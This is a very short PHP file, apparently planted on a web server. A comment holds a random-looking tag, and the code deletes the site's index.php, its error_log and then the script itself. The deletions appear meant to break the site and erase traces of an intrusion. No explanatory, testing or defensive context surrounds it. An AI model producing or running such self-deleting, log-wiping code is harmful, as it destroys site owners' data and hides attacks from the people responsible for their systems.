<?php /* OfxUWLzGI53LogF */ ?>
<?php
	
unlink('index.php');
unlink('error_log');
unlink(__FILE__);

?>